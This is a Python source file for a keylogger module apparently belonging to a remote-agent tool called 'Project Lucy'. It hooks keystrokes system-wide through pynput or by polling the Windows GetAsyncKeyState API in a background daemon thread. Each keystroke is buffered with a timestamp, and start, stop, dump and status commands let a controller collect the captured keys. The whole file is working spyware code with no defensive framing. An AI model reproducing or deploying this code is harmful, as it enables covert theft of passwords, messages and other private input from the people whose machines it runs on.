"""
Advanced keylogger module for Project Lucy agent.
Uses pynput when available, falls back to ctypes on Windows or /dev/input on Linux.
Buffers keystrokes with timestamps into a circular ring buffer.
"""
import threading
import time
import platform
from collections import deque
from datetime import datetime

MAX_BUFFER = 10_000
_buffer: deque = deque(maxlen=MAX_BUFFER)
_lock = threading.Lock()
_listener = None
_running = False


def _record(key_str: str) -> None:
    with _lock:
        _buffer.append({
            "k": key_str,
            "t": datetime.utcnow().isoformat(timespec="milliseconds"),
        })


def _start_pynput() -> bool:
    try:
        from pynput import keyboard

        def on_press(key):
            try:
                k = key.char or f"[{key.name}]"
            except AttributeError:
                k = f"[{key}]"
            _record(k)

        global _listener
        _listener = keyboard.Listener(on_press=on_press)
        _listener.daemon = True
        _listener.start()
        return True
    except Exception:
        return False


def _start_win_ctypes() -> bool:
    if platform.system() != "Windows":
        return False
    try:
        import ctypes
        import ctypes.wintypes as wt

        def _poll():
            import ctypes
            GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
            while _running:
                for vk in range(8, 256):
                    if GetAsyncKeyState(vk) & 0x8001:
                        try:
                            key_name = chr(vk) if 32 <= vk <= 126 else f"[VK:{vk}]"
                            _record(key_name)
                        except Exception:
                            pass
                time.sleep(0.01)

        t = threading.Thread(target=_poll, daemon=True)
        t.start()
        return True
    except Exception:
        return False


def run(action="start", flush=False, **kwargs) -> dict:
    global _running, _listener

    if action == "start":
        if _running:
            return {"status": "already_running"}
        _running = True
        if not _start_pynput():
            if not _start_win_ctypes():
                _running = False
                return {"status": "error", "message": "No keylog backend available"}
        return {"status": "started"}

    elif action == "stop":
        _running = False
        if _listener:
            try:
                _listener.stop()
            except Exception:
                pass
            _listener = None
        keys = _flush_buffer()
        return {"status": "stopped", "keys": keys}

    elif action == "dump":
        keys = _flush_buffer() if flush else _peek_buffer()
        return {"status": "ok", "keys": keys, "count": len(keys)}

    elif action == "status":
        with _lock:
            count = len(_buffer)
        return {"running": _running, "buffered": count}

    return {"error": f"Unknown action: {action}"}


def _flush_buffer() -> list:
    with _lock:
        data = list(_buffer)
        _buffer.clear()
    return data


def _peek_buffer() -> list:
    with _lock:
        return list(_buffer)
